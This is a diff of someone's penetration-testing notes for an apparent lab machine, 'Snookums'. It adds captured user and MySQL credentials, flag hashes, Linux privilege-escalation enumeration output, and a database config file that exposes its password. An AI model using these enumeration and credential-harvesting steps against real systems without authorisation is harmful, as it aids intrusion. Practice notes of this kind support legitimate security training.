@@ -2,13 +2,17 @@
 
 - IP Address:  192.168.162.58
 - Hostname: Snookums
-- OS: 	Unix
+- OS: 	Unix / CentOS 7
 - Found Credentials/Users:
+Michael:HockSydneyCertify123
+Josh:MobilizeHissSeedtime747
+Serena:OverallCrestLean000
+Root:MalapropDoffUtilize1337 (MySql)
 
 Main Objectives:
 
-Local.txt = 
-Proof.txt = 
+Local.txt = 5b454ee55cf8dd4e7450f1e533c4e6ff
+Proof.txt = 334ae9e212973d66f380a02432009714
 
 **Enumeration**
 
@@ -556,45 +560,163 @@ export TERM=xterm
 ```
 # Linux
 hostname
-
+snookums
 
 uname -a
-
+Linux snookums 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
 cat /etc/os-release 2>/dev/null
-
+NAME="CentOS Linux"
+VERSION="7 (Core)"
+ID="centos"
 
 env
-
-
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+PWD=/
+LANG=C
+NOTIFY_SOCKET=/run/systemd/notify
+SHLVL=2
+_=/usr/bin/env
 
 echo $PATH
-
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
 
 find / -writable -type d 2>/dev/null | head
-
+/dev/mqueue
+/dev/shm
+/proc/1985/task/1985/fd
+/proc/1985/fd
+/proc/1985/map_files
+/var/tmp
+/var/lib/php/session
+/var/lib/dav
+/var/cache/httpd
+/var/cache/httpd/proxy
 
 find / -perm -4000 -type f 2>/dev/null
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/pkexec
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
 
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-
-/usr/bin/su
+-rwsr-xr-x. 1 root root 73888 Aug  8  2019 /usr/bin/chage
+-rwsr-xr-x. 1 root root 78408 Aug  8  2019 /usr/bin/gpasswd
+-rws--x--x. 1 root root 23968 Apr  1  2020 /usr/bin/chfn
+-rws--x--x. 1 root root 23880 Apr  1  2020 /usr/bin/chsh
+-rwsr-xr-x. 1 root root 41936 Aug  8  2019 /usr/bin/newgrp
+-rwsr-xr-x. 1 root root 32128 Apr  1  2020 /usr/bin/su
+---s--x--x. 1 root root 147336 Apr  1  2020 /usr/bin/sudo
+-rwsr-xr-x. 1 root root 44264 Apr  1  2020 /usr/bin/mount
+-rwsr-xr-x. 1 root root 31984 Apr  1  2020 /usr/bin/umount
+-rwsr-xr-x. 1 root root 57656 Aug  8  2019 /usr/bin/crontab
+-rwsr-xr-x. 1 root root 23576 Apr  1  2020 /usr/bin/pkexec
+-rwsr-xr-x. 1 root root 32096 Oct 30  2018 /usr/bin/fusermount
+-rwsr-xr-x. 1 root root 27856 Mar 31  2020 /usr/bin/passwd
+-rwsr-xr-x. 1 root root 36272 Apr  1  2020 /usr/sbin/unix_chkpwd
+-rwsr-xr-x. 1 root root 11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
+-rwsr-xr-x. 1 root root 11296 Mar 31  2020 /usr/sbin/usernetctl
+-rwsr-xr-x. 1 root root 15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-x---. 1 root dbus 58024 Mar 14  2019 /usr/libexec/dbus-1/dbus-daemon-launch-helper
 
 cat /etc/crontab 2>/dev/null
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  
 
 ls -la /etc/cron.*
+-rw-------. 1 root root  0 Aug  8  2019 /etc/cron.deny
 
+/etc/cron.d:
+total 16
+drwxr-xr-x.  2 root root   21 Jun  9  2020 .
+drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
+-rw-r--r--.  1 root root  128 Aug  8  2019 0hourly
+
+/etc/cron.daily:
+total 20
+drwxr-xr-x.  2 root root   42 Jun  9  2020 .
+drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
+-rwx------.  1 root root  219 Mar 31  2020 logrotate
+-rwxr-xr-x.  1 root root  618 Oct 30  2018 man-db.cron
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.  2 root root   22 Jun  9  2014 .
+drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
+-rwxr-xr-x.  1 root root  392 Aug  8  2019 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 79 root root 8192 Jan 12 21:44 ..
 
 crontab -l 2>/dev/null
 
 getcap -r / 2>/dev/null
-
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
 
 ls -l /etc/shadow
-
-
+----------. 1 root root 802 Jun  9  2020 /etc/shadow
 
 ls -la /  
+total 20
+dr-xr-xr-x.  17 root root  224 Jun  9  2020 .
+dr-xr-xr-x.  17 root root  224 Jun  9  2020 ..
+lrwxrwxrwx.   1 root root    7 Jun  9  2020 bin -> usr/bin
+dr-xr-xr-x.   5 root root 4096 Jun  9  2020 boot
+drwxr-xr-x.  19 root root 3100 Jan 12 21:44 dev
+drwxr-xr-x.  79 root root 8192 Jan 12 21:44 etc
+drwxr-xr-x.   3 root root   21 Jun  9  2020 home
+lrwxrwxrwx.   1 root root    7 Jun  9  2020 lib -> usr/lib
+lrwxrwxrwx.   1 root root    9 Jun  9  2020 lib64 -> usr/lib64
+drwxr-xr-x.   2 root root    6 Apr 11  2018 media
+drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
+drwxr-xr-x.   2 root root    6 Apr 11  2018 opt
+dr-xr-xr-x. 176 root root    0 Feb 26  2025 proc
+dr-xr-x---.   3 root root  163 Jan 12 21:44 root
+drwxr-xr-x.  28 root root  820 Feb 26  2025 run
+lrwxrwxrwx.   1 root root    8 Jun  9  2020 sbin -> usr/sbin
+drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
+dr-xr-xr-x.  13 root root    0 Feb 26  2025 sys
+drwxrwxrwt.   2 root root    6 Feb 26  2025 tmp
+drwxr-xr-x.  13 root root  155 Jun  9  2020 usr
+drwxr-xr-x.  21 root root 4096 Jun  9  2020 var
 
 
 ```
@@ -604,18 +726,55 @@ ls -la /
 ```
 # Linux
 whoami
-
+apache
 
 id
-
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
 
 cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+michael:x:1000:1000:Michael:/home/michael:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
 
 
 ls -la /home
-
+total 0
+drwxr-xr-x.  3 root    root     21 Jun  9  2020 .
+dr-xr-xr-x. 17 root    root    224 Jun  9  2020 ..
+drwx------.  2 michael michael 100 Jul  9  2020 michael
 
 sudo -l
+sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+sudo: no tty present and no askpass program specified
 
 
 
@@ -626,6 +785,25 @@ sudo -l
 ```
 # Linux
 ss -tulwn
+Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+udp    UNCONN     0      0         *:929                   *:*                  
+udp    UNCONN     0      0         *:111                   *:*                  
+udp    UNCONN     0      0      127.0.0.1:323                   *:*                  
+udp    UNCONN     0      0      [::]:929                [::]:*                  
+udp    UNCONN     0      0      [::]:111                [::]:*                  
+udp    UNCONN     0      0         [::1]:323                [::]:*                  
+tcp    LISTEN     0      50        *:139                   *:*                  
+tcp    LISTEN     0      128       *:111                   *:*                  
+tcp    LISTEN     0      128       *:22                    *:*                  
+tcp    LISTEN     0      50        *:445                   *:*                  
+tcp    LISTEN     0      128    [::]:3306               [::]:*                  
+tcp    LISTEN     0      50     [::]:139                [::]:*                  
+tcp    LISTEN     0      128    [::]:111                [::]:*                  
+tcp    LISTEN     0      128    [::]:80                 [::]:*                  
+tcp    LISTEN     0      32     [::]:21                 [::]:*                  
+tcp    LISTEN     0      128    [::]:22                 [::]:*                  
+tcp    LISTEN     0      50     [::]:445                [::]:*                  
+tcp    LISTEN     0      70     [::]:33060              [::]:*   
 
 netstat -tulnp 2>/dev/null
 ```
@@ -647,6 +825,12 @@ ps -ef
 grep -R "password" /etc 2>/dev/null | head
 
 ls -la /var/www 2>/dev/null
+total 8
+drwxr-xr-x.  4 root root   33 Jun  9  2020 .
+drwxr-xr-x. 21 root root 4096 Jun  9  2020 ..
+drwxr-xr-x.  2 root root    6 Apr  2  2020 cgi-bin
+drwxr-xr-x.  8 root root 4096 Jul 15  2020 html
+
 
 find /home -name "*.txt" 2>/dev/null
 
@@ -667,7 +851,520 @@ find / -name "*.bak" -o -name "*~" 2>/dev/null | head
 5. Automated Enumeration
 
 ```
+Sudo version 1.8.23  
 
+root      1043  0.0  0.0  53288   572 ?        Ss   20:41   0:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
+
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                                   
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN  
+
+-rw-r--r--. 1 root root 475 Apr  7  2020 /usr/lib/firewalld/services/vnc-server.xml
+<?xml version="1.0" encoding="utf-8"?>
+<service>
+  <short>Virtual Network Computing Server (VNC)</short>
+  <description>A VNC server provides an external accessible X session. Enable this option if you plan to provide a VNC server with direct access. The access will be possible for displays :0 to :3. If you plan to provide access with SSH, do not open this option and use the via option of the VNC viewer.</description>                                
+  <port protocol="tcp" port="5900-5903"/>
+</service>
+
+/usr/share/doc/vsftpd-3.0.2/
+
+```
+5. Possible PE Paths
+
+```
+getcap -r / 2>/dev/null
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+# This don't appear to be vulnerable
+
+Sudo version 1.8.23
+# Most of the exploit I found require you run sudo -l. I don't have apache password.  
+
+-rw-r--r--. 1 root root 475 Apr  7  2020 /usr/lib/firewalld/services/vnc-server.xml
+<?xml version="1.0" encoding="utf-8"?>
+<service>
+  <short>Virtual Network Computing Server (VNC)</short>
+  <description>A VNC server provides an external accessible X session. Enable this option if you plan to provide a VNC server with direct access. The access will be possible for displays :0 to :3. If you plan to provide access with SSH, do not open this option and use the via option of the VNC viewer.</description>                                
+  <port protocol="tcp" port="5900-5903"/>
+</service>
+# Did not see anything obvious that this could be used for privilege esculation.
+
+MSQL 3306 33060
+# Tried mysql -u root and mysql -u root 33060
+
+root      1043  0.0  0.0  53288   572 ?        Ss   12:28   0:00 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
+cd /etc/vsftpd
+bash-4.2$ ls
+ls
+ftpusers  user_list  vsftpd.conf  vsftpd_conf_migrate.sh
+bash-4.2$ ls -la
+ls -la
+total 32
+drwxr-xr-x.  2 root root   88 Jun  9  2020 .
+drwxr-xr-x. 79 root root 8192 Jan 13 13:31 ..
+-rw-------.  1 root root  125 Apr  1  2020 ftpusers
+-rw-------.  1 root root  361 Apr  1  2020 user_list
+-rw-------.  1 root root 5116 Apr  1  2020 vsftpd.conf
+-rwxr--r--.  1 root root  338 Apr  1  2020 vsftpd_conf_migrate.sh
+bash-4.2$ cat vsftpd_conf_migrate.sh
+cat vsftpd_conf_migrate.sh
+#!/bin/bash
+#move old config files and symlink them
+#shipped with vsftpd-2.0.1-6
+PREFIX="vsftpd"
+for file in $( ls /etc/${PREFIX}.* ); do
+    if [ ! -L $file ]; then
+        new=`echo $file | sed s/${PREFIX}\./${PREFIX}\\\\//g | sed s/\.rpmsave//g`
+        mv -f ${file} ${new}
+        ln -s ${new} ${file}
+        echo $file moved to $new
+    fi
+done
+
+
+[+] SUID binaries
+$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/pkexec
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/sbin/unix_chkpwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+
+[+] SGID binaries
+$ find / -perm -2000 -type f 2>/dev/null
+/usr/bin/wall
+/usr/bin/write
+/usr/bin/ssh-agent
+/usr/sbin/netreport
+/usr/sbin/postdrop
+/usr/sbin/postqueue
+/usr/libexec/utempter/utempter
+
+$ find / -writable -type d 2>/dev/null | head -n 50
+/dev/mqueue
+/dev/shm
+/var/tmp
+/var/lib/php/session
+/var/lib/dav
+/var/cache/httpd
+/var/cache/httpd/proxy
+/var/spool/samba
+/tmp
+
+CentOS version 7 Linux snookums 3.10.0-1127.10.1.el7.x86_64
+
+bash-4.2$ cat db.php
+cat db.php
+<?php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'MalapropDoffUtilize1337');
+define('DBNAME', 'SimplePHPGal');
+?>
+
+
+
+```
+
+**Post-Exploitation**
+
+1. Basic System Info
+
+```
+================================================================================
+1) Identity & System Info
+================================================================================
+
+[+] whoami
+$ whoami
+michael
+
+[+] id
+$ id
+uid=1000(michael) gid=1000(michael) groups=1000(michael) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[+] hostname
+$ hostname
+snookums
+
+[+] pwd
+$ pwd
+/home/michael
+
+[+] uname -a
+$ uname -a
+Linux snookums 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+[+] os-release / issue
+$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
+NAME="CentOS Linux"
+VERSION="7 (Core)"
+ID="centos"
+ID_LIKE="rhel fedora"
+VERSION_ID="7"
+PRETTY_NAME="CentOS Linux 7 (Core)"
+ANSI_COLOR="0;31"
+CPE_NAME="cpe:/o:centos:centos:7"
+HOME_URL="https://www.centos.org/"
+BUG_REPORT_URL="https://bugs.centos.org/"
+
+CENTOS_MANTISBT_PROJECT="CentOS-7"
+CENTOS_MANTISBT_PROJECT_VERSION="7"
+REDHAT_SUPPORT_PRODUCT="centos"
+REDHAT_SUPPORT_PRODUCT_VERSION="7"
+
+
+
+```
+
+2. User Enumeration
+
+```
+================================================================================
+2) Environment
+================================================================================
+
+[+] env
+$ env
+XDG_SESSION_ID=4
+HOSTNAME=snookums
+SELINUX_ROLE_REQUESTED=
+TERM=xterm-256color
+SHELL=/bin/bash
+HISTSIZE=1000
+SSH_CLIENT=192.168.45.151 36126 22
+SELINUX_USE_CURRENT_RANGE=
+SSH_TTY=/dev/pts/1
+USER=michael
+LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:
+MAIL=/var/spool/mail/michael
+PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/michael/.local/bin:/home/michael/bin
+_=/usr/bin/env
+PWD=/home/michael
+LANG=en_US.UTF-8
+SELINUX_LEVEL_REQUESTED=
+HISTCONTROL=ignoredups
+SHLVL=3
+HOME=/home/michael
+LOGNAME=michael
+SSH_CONNECTION=192.168.45.151 36126 192.168.162.58 22
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+XDG_RUNTIME_DIR=/run/user/1000
+
+[+] set (first 50)
+$ set 2>/dev/null | head -n 50
+BASH=/usr/bin/bash
+BASHOPTS=cmdhist:extquote:force_fignore:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
+BASH_ALIASES=()
+BASH_ARGC=()
+BASH_ARGV=()
+BASH_CMDS=()
+BASH_EXECUTION_STRING='set 2>/dev/null | head -n 50'
+BASH_LINENO=()
+BASH_SOURCE=()
+BASH_VERSINFO=([0]="4" [1]="2" [2]="46" [3]="2" [4]="release" [5]="x86_64-redhat-linux-gnu")
+BASH_VERSION='4.2.46(2)-release'
+DIRSTACK=()
+EUID=1000
+GROUPS=()
+HISTCONTROL=ignoredups
+HISTSIZE=1000
+HOME=/home/michael
+HOSTNAME=snookums
+HOSTTYPE=x86_64
+IFS=$' \t\n'
+LANG=en_US.UTF-8
+LESSOPEN='||/usr/bin/lesspipe.sh %s'
+LOGNAME=michael
+LS_COLORS='rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:'
+MACHTYPE=x86_64-redhat-linux-gnu
+MAIL=/var/spool/mail/michael
+OPTERR=1
+OPTIND=1
+OSTYPE=linux-gnu
+PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/michael/.local/bin:/home/michael/bin
+PPID=5648
+PS4='+ '
+PWD=/home/michael
+SELINUX_LEVEL_REQUESTED=
+SELINUX_ROLE_REQUESTED=
+SELINUX_USE_CURRENT_RANGE=
+SHELL=/bin/bash
+SHELLOPTS=braceexpand:hashall:interactive-comments
+SHLVL=3
+SSH_CLIENT='192.168.45.151 36126 22'
+SSH_CONNECTION='192.168.45.151 36126 192.168.162.58 22'
+SSH_TTY=/dev/pts/1
+TERM=xterm-256color
+UID=1000
+USER=michael
+XDG_RUNTIME_DIR=/run/user/1000
+XDG_SESSION_ID=4
+_=/usr/bin/bash
+
+[+] PATH
+$ echo "$PATH"
+/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/michael/.local/bin:/home/michael/bin
+
+[+] HOME and SHELL
+$ echo "HOME=$HOME"; echo "SHELL=$SHELL"
+HOME=/home/michael
+SHELL=/bin/bash
+
+
+
+```
+
+3. Network Information
+
+```
+================================================================================
+3) Users & Home Directories
+================================================================================
+
+[+] /etc/passwd
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+michael:x:1000:1000:Michael:/home/michael:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+
+[+] home directories
+$ ls -la /home
+total 0
+drwxr-xr-x.  3 root    root     21 Jun  9  2020 .
+dr-xr-xr-x. 17 root    root    224 Jun  9  2020 ..
+drwx------.  2 michael michael 158 Jan 13 14:48 michael
+
+[+] root home (if accessible)
+$ ls -la /root 2>/dev/null
+
+[+] sudo -l
+$ sudo -l 2>/dev/null
+[sudo] password for michael: 
+
+[+] sudo -V (first 10)
+$ sudo -V 2>/dev/null | head -n 10
+Sudo version 1.8.23
+Sudoers policy plugin version 1.8.23
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.23
+
+```
+
+4. Software, Service, and Process Information
+
+```
+$ netstat -tulnp 2>/dev/null
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::3306                 :::*                    LISTEN      -                   
+tcp6       0      0 :::139                  :::*                    LISTEN      -                   
+tcp6       0      0 :::111                  :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::445                  :::*                    LISTEN      -                   
+tcp6       0      0 :::33060                :::*                    LISTEN      -                   
+udp        0      0 0.0.0.0:929             0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:111             0.0.0.0:*                           -                   
+udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
+udp6       0      0 :::929                  :::*                                -                   
+udp6       0      0 :::111                  :::*                                -                   
+udp6       0      0 ::1:323                 :::*                                -                   
+
+
+samba-client-libs-4.10.4-11.el7_8.x86_64
+rpcbind-0.2.0-49.el7.x86_64
+```
+
+4. Loot files.
+```
+================================================================================
+3) Users & Home Directories
+================================================================================
+
+[+] /etc/passwd
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
